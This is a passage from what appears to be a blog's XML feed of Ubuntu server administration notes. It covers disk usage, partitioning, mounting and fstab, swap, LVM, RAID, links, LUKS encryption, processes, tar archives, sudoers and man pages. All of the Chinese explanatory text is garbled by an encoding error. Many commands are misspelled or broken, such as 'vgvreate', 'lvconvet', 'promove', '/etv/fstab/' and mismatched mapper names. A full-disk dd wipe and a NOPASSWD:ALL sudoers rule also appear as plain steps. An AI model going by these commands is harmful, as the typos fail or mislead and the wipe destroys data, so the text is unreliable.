    <content type="text"><![CDATA[åŸºæœ¬ç¯‡ å­˜å‚¨ å¯¹ç£ç›˜çš„æ‰€æœ‰æ“ä½œéƒ½è¦å°å¿ƒå°å¿ƒå†å°å¿ƒ ç£ç›˜æ˜¯è®¡ç®—æœºä¸­æœ€ä¸»è¦çš„å­˜å‚¨è®¾å¤‡ ä¼ ç»Ÿç£ç›˜åˆ†åŒºä¸é€»è¾‘å·ç®¡ç† äº‹å‰åˆç†è§„åˆ’å¾ˆé‡è¦ å¯¹ç£ç›˜çš„æ‰€æœ‰æ“ä½œéƒ½è¦å°å¿ƒå°å¿ƒå†å°å¿ƒ ç£ç›˜ç©ºé—´ç®¡ç† df æŸ¥çœ‹ç¡¬ç›˜æ€»ä½“ä½¿ç”¨æƒ…å†µ`bash df â€œâ€â€ç¬¬ä¸€åˆ—ï¼š æ–‡ä»¶ç³»ç»Ÿç¬¬äºŒåˆ—ï¼š å­˜å‚¨ç©ºé—´ï¼ˆå¤šå°‘æ•°æ®å—ï¼‰ç¬¬ä¸‰åˆ—ï¼š ä½¿ç”¨é‡ç¬¬å››åˆ—ï¼š å¯ç”¨é‡ç¬¬äº”åˆ—ï¼šä½¿ç”¨ç‡ç¬¬å…­åˆ—ï¼šæŒ‚è½½ç‚¹â€œâ€â€ df -h # äººæ€§åŒ–çš„æ–¹å¼ df -i # æŸ¥çœ‹inodesä½¿ç”¨é‡ - `du` æŸ¥çœ‹è¯¦ç»†ä¿¡æ¯ &gt;æ˜¯è°æ‹¿èµ°äº†æˆ‘çš„å­˜å‚¨ç©ºé—´ ```bash du # æŸ¥çœ‹æ‰€æœ‰ du / # æŸ¥çœ‹æ ¹ç›®å½•/ç›®å½•ä¸‹çš„æ–‡ä»¶å¤§å° ''' ç»“åˆsudoæƒé™ ''' '-h # äººç±»æ˜“äºé˜…è¯»æ–¹å¼' sudo du / -h '- s # æ±‡æ€»' sudo du /* -hs # æ˜¾ç¤ºæ±‡æ€»ç»“æœ '-c # é™¤äº†å­æ–‡ä»¶å’Œå­ç›®å½•ä¹‹å¤–ï¼Œå¤–åŠ ä¸€ä¸ªæ€»å’Œ ' sudo du /usr/* -hsc ç¬¬ä¸‰æ–¹å·¥å…· ncdu ï¼ˆæ¯”è¾ƒäººæ€§åŒ–çš„å·¥å…·ï¼‰`bash apt install ncdu # å®‰è£… ncdu # ä½¿ç”¨ï¼ˆå¯ä»¥æ–¹å‘é”®å’Œå›è½¦è¿›å…¥è¿”å›ä» æŸ¥çœ‹ï¼‰æŒ‰ä½â€™tâ€™ å…ˆæ˜¾ç¤ºç›®å½•ï¼Œå†æ˜¾ç¤ºæ–‡ä»¶æŒ‰ä½â€™gâ€™ æ˜¾ç¤ºç™¾åˆ†æ¯”â€˜qâ€™é€€å‡º # æ·»åŠ ç¡¬ç›˜ &gt;æ‰©å®¹ ç”¨vboxæ¨¡æ‹Ÿæ·»åŠ ç¡¬ç›˜ï¼šå­˜å‚¨-&gt;SATA-&gt;æ·»åŠ ç¡¬ç›˜ ###### 1.ç£ç›˜è®¾å¤‡åç§° `dmsg`å‘½ä»¤æŸ¥çœ‹è®¾å¤‡æ—¥å¿— `/dev/`ç›®å½•ä¸‹é¢å¯ä»¥æŸ¥çœ‹è®¾å¤‡çš„åç§° `ls /dev/sd` ###### 2.ç¡¬ç›˜åˆ†åŒº ```bash ## 1. fdisk -m å¸®åŠ©èœå•ï¼ˆæŸ¥çœ‹å‚æ•°ï¼‰ # æŸ¥çœ‹æ‰€æœ‰ç¡¬ç›˜è®¾å¤‡å’Œåˆ†åŒºæƒ…å†µ sudo fdisk -l # åˆ†åŒº sudo fdisk /dev/sdb # è¿›å…¥å‘å¯¼ # å…ˆåˆ›å»ºåˆ†åŒºè¡¨ O # dosï¼Œ MBRåˆ†åŒºï¼ˆåŸºæœ¬åˆ†åŒºï¼‰ ä¼ ç»Ÿåˆ†åŒºæ ¼å¼ï¼Œæœ€å¤§å››ä¸ª(ä¸»)åˆ†åŒºï¼Œ2Tå®¹é‡é™åˆ¶ g # GPT æœªæ¥æ ‡å‡†ï¼Œ128ä¸ªåˆ†åŒºï¼Œæ— å®¹é‡é™åˆ¶ï¼Œæ¨èä½¿ç”¨ # ä¼šç”Ÿæˆä¸€ä¸ª16è¿›åˆ¶çš„guid # å†åˆ›å»ºåˆ†åŒº n è¾“å…¥æ•°å­—ç¼–å·ï¼ˆåé—¨ä¼šé€’å¢ï¼‰ ç¬¬ä¸€ä¸ªæ‰‡åŒºåœ¨å“ªä¸ªä½ç½®ã€è®©æ‰‡åŒºå†³å®šç£ç›˜å¤§å°ã€‘ è¾“å…¥ç»“æŸæ‰‡åŒºï¼ˆé»˜è®¤æœ€åä¸€ä¸ªæ‰‡åŒºï¼‰ ã€ä¹Ÿå¯ä»¥ç›´æ¥è¾“å…¥100Mè¿™ç§æ–¹å¼ã€‘ # å†ä¿å­˜åˆ†åŒº w # æŸ¥çœ‹åˆ†åŒºç»“æœ sudo fdisk -l 3.æ–‡ä»¶ç³»ç»Ÿæ ¼å¼åŒ–mkfs å‘½ä»¤ sudo mkfs.ext4 /dev/sdb1 sudo mkfs.xfs /dev/sdb2 Linuxä¸Šå¸¸ç”¨çš„æ ¼å¼ï¼šext4 ï¼ˆæ™®é€šæ—¥å¸¸ä½¿ç”¨æ¨èï¼‰xfs ï¼ˆé€‚ç”¨ä¸è¶…å¤§ç©ºé—´æ¯”å¦‚100T, å¤šæ–‡ä»¶ï¼Œæ•°æ®åº“ï¼‰ 4. æŒ‚è½½ ç»‘å®šè®¿é—®è·¯å¾„ ä¸€èˆ¬ä¸¤ä¸ªæŒ‚è½½ç›®å½•:/mnt/ ä¸€èˆ¬æ˜¯ç¡¬ç›˜ç­‰ ï¼ˆä¸‹é¢åˆ›å»ºç©ºçš„å­ç›®å½•å†æŒ‚åˆ°å­ç›®å½•ä¸‹ï¼‰/media/ ä¸€èˆ¬ä¹ æƒ¯ä½¿ç”¨æŒ‚ï¼š uç›˜ç­‰ç§»åŠ¨å­˜å‚¨ 1.mountå‘½ä»¤ (ä¸´æ—¶æ€§çš„ï¼Œé‡å¯ä¹‹åå¤±æ•ˆ) # sdbä»£è¡¨é‚£å—ç¡¬ç›˜ï¼Œ sdb1ä»£è¡¨é‚£ä¸ªåˆ†åŒº sudo mount /dev/sdb1 /mnt/storge/ # -t å£°æ˜æ ¼å¼ sudo mount /dev/sdb1 -t ext4 /mnt/storge/ # å¸è½½ç›®å½•ä¸‹é¢çš„è®¾å¤‡ï¼ˆå¦‚æœbusyå°±å…ˆé€€å‡ºè¿™ä¸ªç›®å½•å…ˆä¸è¦ä½¿ç”¨ï¼‰ sudo umount /storage è‡ªåŠ¨æŒ‚è½½ /etc/fstab`bash â€˜â€™â€™ç¬¬ä¸€åˆ—ï¼šè®¾å¤‡ID UUIDï¼Œ å”¯ä¸€çš„æ ‡å·/ è®¾å¤‡åä¹Ÿå¯ä»¥ï¼Œæ¨èidç¬¬äºŒåˆ—ï¼šæŒ‚è½½ç‚¹ swapæ— éœ€æŒ‚è½½(none)ç¬¬ä¸‰åˆ—ï¼šæ–‡ä»¶ç³»ç»Ÿ ext4, swapâ€¦ç¬¬å››åˆ—ï¼šoptions ï¼ˆ å‚æ•°ï¼Œ error=remount-roçš„æ„æ€æ˜¯å‘ç”Ÿé”™è¯¯åªè¯»å½¢å¼æŒ‚ï¼‰ ä¸€èˆ¬å¡«å†™é»˜è®¤å°±è¡Œ defaults:rw,exec,auto,nouser.asynchronousï¼ˆå¼‚æ­¥å­˜å‚¨ï¼‰ nouserè¡¨ç¤ºå½“å‰ç”¨æˆ·æ‰å¯ä»¥ç¬¬äº”åˆ—ï¼šdump ï¼ˆåŸºæœ¬æ²¡ç”¨ï¼Œå†™0ä¸å¤‡ä»½å°±è¡Œï¼Œ å¤‡ä»½çš„æ—¶å€™æ‰è®¾ç½®1ï¼‰ ä¸€èˆ¬å†™ 0ç¬¬å…­åˆ—ï¼špass (FSé”™è¯¯æ—¶fsckæ˜¯å¦æ£€æŸ¥é”™è¯¯ï¼Œ0ä¸æ£€æŸ¥ï¼Œ1ä¼˜å…ˆï¼Œ2åæŸ¥ï¼‰ ä¸€èˆ¬å†™ 2 â€˜â€™â€™å®è·µï¼š1.blkid æŸ¥çœ‹è®¾å¤‡UUIDlsblk -fP æŸ¥çœ‹è®¾å¤‡id 2.ç¼–è¾‘æ–‡ä»¶ 3.rebootæˆ–è€…mount -a #å°†/etc/fstabçš„æ‰€æœ‰å†…å®¹é‡æ–°åŠ è½½ ------------------------------------------------- &gt;é«˜çº§ç¯‡ # SWAPç®¡ç† &gt; å¯èƒ½æ˜¯ä½ çš„æ•‘å‘½ç¨»è‰ - å…³äºswapçš„äº‰è®º - éœ€è¦/ä¸éœ€è¦ ï¼ˆRaspberry Piï¼‰ - å¤§å°å¤šå°‘æ‰åˆç†ï¼ˆ2-16Gï¼‰ - Swapåˆ†åŒºï¼Œswapæ–‡ä»¶ - ç†æƒ³çŠ¶æ€ä¸‹åº”è¯¥æ— äº‹å¯åšçš„swap - å¤§é‡çš„swapç©ºé—´ä½¿ç”¨æ„å‘³ç€æœåŠ¡å™¨å·²ç–²äºå¥”å‘½ - free -m free -h æŸ¥çœ‹å†…å­˜ä»¥åŠswapçš„ - æŸäº›äº‘ä¸»æœºé»˜è®¤æ²¡æœ‰swap ubuntuä¸­ï¼Œæ˜¯swapæ–‡ä»¶ ###### Swapæ–‡ä»¶ /swapfile #åˆ›å»ºæ–‡ä»¶ åˆ¶å®šå¤§å°ï¼Œä½ç½® `sudo fallocate -l 8G /swapfile` #æŸ¥çœ‹æ–‡ä»¶ `sudo xxd /swapfile` #æ ¼å¼æˆswapæ–‡ä»¶ (è®°ä¸‹ UUID) `sudo mkswap /swapfile` #æŠŠæƒé™è°ƒå° `sudo chmod 0600 /swapfile` #ä¿®æ”¹æŒ‚è½½æ–‡ä»¶ sudo vim /etv/fstab/ `/swapfile none swap sw 0 0` #å…³é—­åŸæ¥çš„swap `sudo swapoff -a` #å¼€å¯ `sudo swapon -a` ###### Swapåˆ†åŒº 1.æ–°å¢åŠ ä¸€å—ç¡¬ç›˜ ï¼ˆå¦‚æœvoxæç¤ºå·²ç»åˆ›å»ºè¿‡äº†ï¼Œæ‰“å¼€ç›®å½•ï¼Œåˆ é™¤é‚£ä¸ªç¡¬ç›˜[ä¸è¦è¯¯åˆ ä¸»ç¡¬ç›˜å’Œå¿«ç…§]ï¼Œå’Œ.preæ–‡ä»¶ï¼› ç¼–è¾‘.vobxæ–‡ä»¶ï¼ŒæŠŠæ–°å¢ç¡¬ç›˜é…ç½®é¡¹åˆ æ‰ï¼‰ `ls /dev/sd*` 2. åˆ†åŒº `fdisk /dev/sdb` 3.æ–°å»ºä¸»åˆ†åŒºï¼Œ`t`ä¿®æ”¹åˆ†åŒºè¡¨ç±»å‹ä¸ºswapåˆ†åŒºçš„æ ¼å¼ `82`ï¼Œ`w`ä¿å­˜é€€å‡º (L åˆ—å‡ºæ‰€æœ‰æ”¯æŒçš„åˆ†åŒºç±»å‹) å¯ä»¥çœ‹åˆ°ï¼š`/dev/sdb`å·²ç»åˆ†å‡ºäº†`/dev/sdb1` 4. æ ¼å¼åŒ–ä¸ºswap sudo mkswap /dev/sdb1 5ä¿®æ”¹æŒ‚è½½æ–‡ä»¶ sudo vim /etv/fstab/ `UUID=xxxxxx none swap sw 0 0` 6.å…³é—­åŸæ¥çš„swap `sudo swapoff -a` #7.é‡æ–°å¼€å¯ `sudo swapon -a` åŸæœ‰çš„swapå°±å¯ä»¥åˆ é™¤å•¦ï½ï½ï½ # LVMç®¡ç† &gt;ä¸€é¡¹å€¼å¾—æ„Ÿè°¢çš„æŠ€æœ¯ - æ— é¡»é‡å¯è®¡ç®—æœºçµæ´»è°ƒæ•´ç¡¬ç›˜ç©ºé—´å¤§å° - ç¡¬ç›˜åˆ†åŒºå¤ªå¤§æµªè´¹ï¼Œå¤ªå°æ— æ³•æ»¡è¶³ä¸šåŠ¡å‘å±•éœ€è¦ - å°†ä¼ ç»Ÿçš„ç¡¬ç›˜åˆ†åŒºé€»è¾‘çš„ç»„åˆä¸ºèµ„æºæ± ï¼ŒæŒ‰éœ€åˆ†é… - æ¦‚å¿µ - Volumn Groups ï¼ˆå·ç»„ï¼‰ï¼ˆæ± åŒ–ï¼‰ï¼š æŠŠç‰©ç†èµ„æºçš„å˜æˆé€»è¾‘çš„ - Physical Volumns (ç‰©ç†å·) - Logical Volumnes ï¼ˆåŸºæœ¬åˆ†åŒºã€RAIDï¼‰ï¼š å¯ä»¥å­˜å‚¨æ•°æ®çš„é€»è¾‘çš„æ¦‚å¿µï¼ŒVGä¸€éƒ¨åˆ†èµ„æºçš„åˆ†å‰² - å®‰è£…åŒ… - sudo apt install lvm2 æ·»åŠ ç¡¬ç›˜ï¼Œ å…ˆåˆ›å»ºPV, å†åˆ›å»ºVG, å†åˆ›å»ºLV **1.ç‰©ç†å·ï¼š** ```bash # åˆ›å»ºç‰©ç†å· sudo pvcreate /dev/sdb # æŸ¥çœ‹ç‰©ç†å· sudo pvdisplay # æŸ¥çœ‹ç®€ç•¥çš„æ‘˜è¦ä¿¡æ¯ sudo pvs 2.å·ç»„ï¼š sudo vgvreate vg01 /dev/sdb # å¯ä»¥ä¸€æ¬¡æ€§æŒ‡å®šå¤šä¸ªpv sudo vgextend vg01 /dev/sdc /dev/sdd # æŸ¥çœ‹æ¦‚è¦ä¿¡æ¯ vgscan / vgs sudo vgs 3.é€»è¾‘å· # åˆ›å»ºé€»è¾‘å·ï¼Œ -n åç§°, -L å¤§å°ï¼Œ ä»å“ªä¸ªvgé‡Œé¢åˆ†å‰²çš„ sudo lvcreate -n lv-database -L 1G vg01 # æŸ¥çœ‹ç®€è¦ä¿¡æ¯ sudo lvdisplay sudo lvscan / lvs # æ ¼å¼åŒ–ï¼Œ(fstabè‡ªåŠ¨)æŒ‚è½½ sudo mkfs.ext4 /dev/vg01/lv-database sudo mount /dev/vg01/lv-database/ /mnt/lv-01 df -h # çµæ´»æ‹“å±•çš„ç‰¹æ€§ sudo lvextend /dev/vg01/lv-01 -l 256 # å¢åŠ å®Œæ¯•åå¤§å¤§å° 256 sudo lvextend /dev/vg01/lv-01 -l +256 # å¸¦åŠ å·ï¼Œåˆå¢åŠ å¤§å° 256ä¸ªå— sudo lvextend /dev/vg01/lv-01 -L +2G # å¢åŠ 2G # VG FREE è°çš„ç™¾åˆ†æ¯” sudo lvextend /dev/vg01/lv-01 -l 50%VG # æ‹“å±•åˆ°vgçš„50% sudo lvextend /dev/vg01/lv-01 -l +50%VG # å†æ‹“å±•vgçš„50% # é€»è¾‘å·æ‰©å……äº† df -h # æ˜¯æ–‡ä»¶ç³»ç»Ÿçš„æŸ¥çœ‹ã€‚ è¿™ä¹‹åè¿˜æ²¡æœ‰å‘Šè¯‰æ–‡ä»¶ç³»ç»Ÿ # æŠŠé€»è¾‘å·çš„æ‰©å……å‘Šè¯‰æ–‡ä»¶ç³»ç»Ÿï¼Œå°±å¯ä»¥ç”¨å•¦ sudo resize2fs /dev/vg01/lv-01 é€»è¾‘å·ç¼©å° umount /dev/vg01/lv-01 # å¿…é¡»ä¸‹çº¿ e2fsck -f /dev/vg01/lv-01 # æ£€æŸ¥æ–‡ä»¶ç³»ç»Ÿ resize2fs /dev/vg01/lv-01 1G # ç¼©å°æ–‡ä»¶ç³»ç»Ÿ lvresize /dev/vg01/lv-01 -L 1G # ç¼©å°é€»è¾‘å· # é‡æ–°æŒ‚è½½æŸ¥çœ‹ sudo mount /dev/vg01/lv-01 /mnt/lv-01/ å¿«ç…§ æ•…éšœæ—¶å¯å›é€€ ä¸´æ—¶å¯å›é€€æœºåˆ¶ï¼Œä¸å¯è§†ä¸ºå¤‡ä»½ (å¤‡ä»½åº”è¯¥æ˜¯å¼‚åœ°å¤‡ä»½) æœ¬åœ°ä¿å­˜ï¼Œå®‰å…¨æ€§æ— æ³•ä¿è¯ ç³»ç»Ÿæ ¹ç›®å½•ä½¿ç”¨å¿«ç…§å¯ä»¥ç”¨äºæµ‹è¯•è¡¥ä¸æ›´æ–° æµ‹è¯•å®Œæˆåˆå¹¶å¹¶åˆ é™¤å¿«ç…§ åˆ›å»ºå¿«ç…§ç­‰åŒåˆ›å»ºä¸€ä¸ªæ–°çš„LVï¼ˆé»˜è®¤æ˜¯ç©ºçš„ï¼‰ åˆå§‹ä¸å ç©ºé—´ï¼Œä½†æ–‡ä»¶å‘ç”Ÿä¿®æ”¹æ—¶åŸå—æ•°æ®è¢«æ‹·è´ å›é€€æ—¶å°†å¿«ç…§ä¸­åŸå§‹æ•°æ®è¦†ç›–å½“å‰å¿«ç…§å·²ç»è¢«ä¿®æ”¹çš„ # å¿«ç…§ -s æ˜¯å¿«ç…§lvï¼Œ -Lå¤§å° sudo lvcreate -s -n s01 -L 2G vg01/lv-01 # å¿«ç…§LVå¯ä»¥è¢«ç›´æ¥æŒ‚åœ¨ï¼Œç”¨äºæ¢å¤å•ä¸ªæ–‡ä»¶ # æ¢å¤å¿«ç…§ï¼ˆæ¢å¤åå¿«ç…§è¢«åˆ é™¤ï¼‰ --mergr å“ªä¸ªå¿«ç…§ sudo lvconvet --merge vg01/s01 # ç›´æ¥æ˜¯ä¸èƒ½æ¢å¤çš„ï¼Œæˆ‘ä»¬æŸ¥çœ‹ä¸€ä¸‹ sudo lvscan # è®©ä»–ä¸æ˜¯activeæ‰è¡Œ sudo umount /mnt/lv-01 # é€€å‡ºå½“å‰ç›®å½•ï¼Œæ‰§è¡Œæ­¤å‘½ä»¤å¸è½½ç›®å½• sudo lvchange -an vg01/lv-01 # -n è®©ä»–ä¸active sudo lvchange -ay vg01/lv-01 # -y è®©ä»–active sudo mount dev/vg01/lv-01 /mnt/lv-01 # é‡æ–°æŒ‚è½½ ç§»åŠ¨ç‰©ç†å·æ•°æ®å½“ç£ç›˜æ€§èƒ½æˆ–è€æ—§ç­‰å› ç´ éœ€è¦æ›´æ¢ç¡¬ç›˜ï¼Œæå‰è½¬ç§»æ•°æ®# åé—¨æ˜¯ç›®æ ‡ç›˜ï¼Œå‰é¢ -n æ˜¯æŒ‡å®šlvæ•°æ®, -i æ•°å€¼ï¼Œæ¯éš”å‡ ç§’æ˜¾ç¤ºä¸€ä¸‹è¿è¡ŒçŠ¶æ€sudo promove -n lv-01 /dev/sdb /dev/sdc -i 1sudo pvdislpay ä»ä¸šåŠ¡çš„è§’åº¦æ¥æ€è€ƒæŠ€æœ¯ï¼Œä¸è¦åšä¹¦å‘†å­æŠ€æœ¯äººå‘˜ RAID é«˜çº§ç®¡ç† ä¸LVMç»“åˆå°†è¾¾åˆ°å®Œç¾ è½¯RAIDåŸºäºmdadmé©±åŠ¨å®ç°è½¯RAIDå¹¶ä¸æ¯”ç¡¬RAIDå·® sudo apt install mdadm sudo mdadm -C -v /dev/md0 -l1 -n2 /dev/sdb /dev/sdc -z100M -x1 /dev/sdd -C åˆ›å»º -v è¯¦ç»†ä¿¡æ¯ -l RAIDç±»å‹ï¼ˆ0ï¼Œ1ï¼Œ5ï¼Œ6ï¼Œ10ï¼‰ -n RAIDç›˜æ•°é‡ -z ä»æ¯ä¸ªç¡¬ç›˜å ç”¨å¤šå°‘ç©ºé—´åˆ›å»ºRAID -x Spareç›˜ï¼ˆå¤‡ç”¨ç›˜ï¼‰æ•°é‡+ç›˜å # çº¦å®šä¿—æˆï¼š é€»è¾‘è®¾å¤‡ï¼šä»¥0ç»“å°¾ï¼Œç‰©ç†è®¾å¤‡ä»¥1ç»“å°¾ å¸¸ç”¨ç®¡ç†å‘½ä»¤ï¼š æŸ¥çœ‹raidç›˜çš„çŠ¶å†µï¼š cat /proc/mdstat ï¼ˆå¼€æœºä¹‹åä¸´æ—¶ç”Ÿæˆçš„ï¼‰-r åˆ é™¤ç‰©ç†ç¡¬ç›˜ï¼ˆå¦‚æœæ­£å¸¸çŠ¶æ€ä¸‹æ˜¯æç¤ºbusyçš„ï¼Œ å¯ä»¥-fè®¾ç½®å¤±æ•ˆ, â€“re-addé‡æ–°åŠ å…¥ç£ç›˜é˜µåˆ—ï¼‰-A æ‰‹åŠ¨å‡ºå‘æ•°æ®åŒæ­¥ æ›¿æ¢ç¡¬ç›˜åå®‰è£…Grub(ç³»ç»Ÿå¯åŠ¨ç›˜)sudo grub-install /dev/md0 æ ¼å¼åŒ–å’ŒåŠ è½½sudo mkfs.ext4 /dev/md0 é“¾æ¥ ç¬¦å·é“¾æ¥(è½¯é“¾æ¥) å’Œ ç¡¬é“¾æ¥ ls -li ï¼ˆæŸ¥çœ‹inodeå€¼ï¼‰ inode: å­˜æ”¾æ–‡ä»¶å…ƒæ•°æ®çš„æ•°æ®å¯¹è±¡ï¼Œè¡¨ç°ä¸ºä¸€ä¸ªæ•°å€¼ç¼–å· åˆ›å»ºç¡¬é“¾æ¥ï¼ˆinodeå€¼æ˜¯ç›¸åŒçš„ï¼Œ ç»™ä¸åŒæ•°æ®èµ·äº†ä¸åŒçš„åï¼‰ ln fileS fileD ln log2013.log ln2013 ç›®å½•ä¸èƒ½åˆ›å»ºç¡¬é“¾æ¥ ä¸èƒ½ç§»åŠ¨ç¡¬é“¾æ¥åˆ°ä¸åŒåˆ†åŒºï¼ˆinodeæ”¹å˜ï¼‰ åˆ›å»ºè½¯é“¾æ¥ ä¸å…±ç”¨inode ln -s fileS fileD ï¼ˆå¯ä»¥è·¨è®¾å¤‡ï¼Œå¯ä»¥ç»™ç›®å½•â€¦ , ç›¸å¯¹è·¯å¾„å’Œç»å¯¹è·¯å¾„ï¼Œ å»ºè®®æºæ–‡ä»¶æ˜¯ç»å¯¹è·¯å¾„ï¼Œç›®æ ‡é“¾æ¥æ˜¯ç›¸å¯¹è·¯å¾„ï¼‰ æ•°æ®åŠ å¯†/ç£ç›˜åŠ å¯† æ•°æ®æœ€å€¼é’± æ¸…é™¤æ‰€æœ‰æ•°æ®ï¼š # æŠŠç£ç›˜æ‰€æœ‰å­—èŠ‚æ•°æ®å…¨è¦†ç›–ä¸º0 sudo dd if=/dev/zero of=/dev/sdc ç£ç›˜åŠ å¯†ï¼š # å®‰è£…è½¯ä»¶åŒ… sudo apt install cryptsetup # åŠ å¯†åˆ†åŒºï¼ˆéœ€æå‰åˆ†åŒº fdiskï¼‰ ï¼ˆboot/å¼•å¯¼åˆ†åŒºæ˜¯ä¸èƒ½åŠ å¯†çš„ï¼‰ sudo cryptsetup luksFormat /dev/sdc1 # æ‰“å¼€åŠ å¯†åˆ†åŒºï¼ˆéšæ„å‘½åï¼‰ sudo cryptsetup luksOpen /dev/sdc1 srypt1 # æ ¼å¼åŒ–åŠ å¯†åˆ†åŒº sudo mkfs.ext4 /dev/mapper/crypt1 # æŒ‚è½½åœ¨åŠ å¯†åˆ†åŒº sudo mount /dev/mapper/crypt1 /mnt/crypt1 # æ›´æ”¹æ‰€æœ‰è€… sudo chown xps:xps /mnt/crypt1 # å…³é—­åŠ å¯†åˆ†åŒº(å…ˆumount) sudo umount /mnt/crypt1 sudo cryptsetup:luksClose crypt1 ä¸ä»…å¯¹ç¡¬ç›˜æœ‰ç”¨ï¼Œ ä¹Ÿå¯ä»¥å¯¹Uç›˜è¿›è¡ŒåŠ å¯†å¯ä»¥ç”¨cryptsetupå¯¹uç›˜åŠ å¯†ï¼Œè®¾ç½®ä¸€ä¸ªè¶³å¤Ÿå¼ºåº¦çš„å¯†ç ï¼Œ ä¹Ÿå¯ä»¥å†æ ¼å¼åŒ–ä¸ºext4æ ¼å¼ï¼Œè®©winç”¨æˆ·ä¸èƒ½ç›´æ¥æ‰“å¼€ document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>ubuntu</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ubuntu server-è¿›ç¨‹ç®¡ç†&æ‰“åŒ…å‹ç¼©]]></title>
    <url>%2Fposts%2Fa6154cbb%2F</url>
    <content type="text"><![CDATA[è¿›ç¨‹ç®¡ç†psä¿¡æ¯ï¼š PIDï¼š è¿›ç¨‹id TTY: è¿è¡Œè¿›ç¨‹çš„ç»ˆç«¯è®¾å¤‡ STATï¼š è¿›ç¨‹çŠ¶æ€(Sleep, Running) TIMEï¼š è¯¥è¿›ç¨‹å ç”¨çš„cpuæ—¶é—´ COMMAND: å‘½ä»¤åç§° å‚æ•°ï¼š -xï¼š å½“å‰ç”¨æˆ·å¯åŠ¨çš„æ‰€æœ‰è¿›ç¨‹ -axï¼š æ‰€æœ‰ç”¨æˆ·å¯åŠ¨çš„è¿›ç¨‹ -uï¼š è¿›ç¨‹è¯¦ç»†ä¿¡æ¯ -aux: -wï¼š æ˜¾ç¤ºè¿›ç¨‹æ–‡ä»¶å®Œæ•´è·¯å¾„ -auxw: ps u PID ($$: å½“å‰shellçš„è¿›ç¨‹id) ps -L pidå· # æŸ¥çœ‹å½“å‰è¿›ç¨‹ä¸‹é¢çš„çº¿ç¨‹ ps fajx # æŸ¥çœ‹è¿›ç¨‹æ ‘ pstree # æ›´ç›´è§‚çš„è¿›ç¨‹æ ‘ # ç»“æŸè¿›ç¨‹ kill pid # é»˜è®¤Term kill -STOP pid # æš‚åœè¿›ç¨‹ ï¼ˆæ€ç—…æ¯’æ€ä¸æ‰çš„æ—¶å€™å¯ä»¥å…ˆstopï¼‰ kill -CONT pid # å›å¤å·²æš‚åœçš„è¿›ç¨‹ kill -KILL pid # kill -9 pid kill -l # æ‰€æœ‰killå‘½ä»¤çš„ä¿¡å· å½’æ¡£æ‰“åŒ…å’Œå‹ç¼©gzip (GUN Zip) gzip file1 gunzip file1.gz # Gzipä¸æ”¯æŒå¤šæ–‡ä»¶/ç›®å½•çš„å½’æ¡£æ‰“åŒ… # ä¼šå¹²æ‰åŸå§‹æ–‡ä»¶ taræ‰“åŒ…å½’æ¡£ (Archive)tar cvf file2.tar file1 file2 file3 # å¹¶ä¸è¿›è¡Œå‹ç¼© gzip file.tar # å¯ä»¥æ‰“åŒ…ä¹‹åå†å‹ç¼© gunzip file.tar.gz # å…ˆè§£å‹ tar xcvf file2.tar # è§£åŒ… # tar ç»“åˆgz tar zcvf file2.tar.gz file1 file2 file3 # å‚æ•°z æ‰“åŒ…åŒäº‹äºšç´¢ tar -ztvf file.tar.gz # -t æ˜¾ç¤ºæ–‡ä»¶å†…å®¹ä½†æ˜¯ä¸è§£å‹ tar jcvf c.tar.bz2 a b # bz2 bzip2é€Ÿåº¦å¯èƒ½æ…¢ä¸€ç‚¹ï¼Œä½†æ˜¯å¯¹æ–‡æœ¬æ–‡ä»¶å‹ç¼©æ›´å° bzip2 f # å‹ç¼© nunzip f.bz2 # tar çš„ -jä¹Ÿå¯ä»¥ tar jcvf c.tar.bz2 a b sudoersudoç”¨æˆ·ç»„ cat /etc/groupä¸­sudoç»„ï¼Œæ‰èƒ½åŠ sudoè¿è¡Œå‘½ä»¤ å¤„äºå®‰å…¨çš„è€ƒè™‘ sudo visudo æ–‡ä»¶/etc/sudoers ç»„ æ‰€æœ‰ä¸»æœº=() ç³»ç»Ÿçš„å“ªäº›å‘½ä»¤ %sudo All=(ALL:ALL) ALL # æŒ‡å®šé…ç½® user_alias ADMINS = user1, user2 # æŒ‡å®šä¸€äº›ç”¨æˆ·çš„åˆ«å ADMINS ALL = (ALL)NOPASSWD:ALL # è¯¥åˆ«åçš„æƒé™ root ALL=(ALL) ALL document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>ubuntu</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ubuntu server-å¸®åŠ©&è¾“å‡ºä¸é‡å®šå‘]]></title>
    <url>%2Fposts%2Fdc8613b5%2F</url>
    <content type="text"><![CDATA[è·å–å¸®åŠ©manman cmd man -k keyword #æœç´¢å…³é”®è¯ï¼ˆä¸çŸ¥é“å…·ä½“å‘½ä»¤ï¼‰ man -k 'list directory contents' # å¤šä¸ªå…³é”®å­— # æ¯ä¸ªå‘½ä»¤çš„ æ‰‹å†Œé¡µ å¯ä»¥ä½¿ç”¨æ•°å­—ç¼–å·å¼•ç”¨ç‰‡æ®µï¼ˆsectionï¼‰ man 5 passwd #ï¼ˆ æŒ‰sectionæŸ¥çœ‹ï¼‰ - 1ï¼š ç”¨æˆ·å‘½ä»¤ - 2ï¼š ç³»ç»Ÿè°ƒç”¨ - 3ï¼š é«˜çº§Unixç¼–ç¨‹åº“æ–‡æ¡£ï¼ˆç¨‹åºå‘˜å¸¸ç”¨ï¼‰ - 4ï¼š è®¾å¤‡å€Ÿå£å’Œé©±åŠ¨ä¿¡æ¯ï¼ˆå¾ˆå°‘ä½¿ç”¨ï¼‰ - 5ï¼š æ–‡ä»¶æè¿°ï¼ˆç³»ç»Ÿé…ç½®æ–‡ä»¶ï¼‰ - 6ï¼š Games - 7ï¼š æ–‡ä»¶æ ¼å¼ï¼Œæƒ¯ä¾‹ï¼Œç¼–ç (ASCIIç­‰) - 8ï¼š 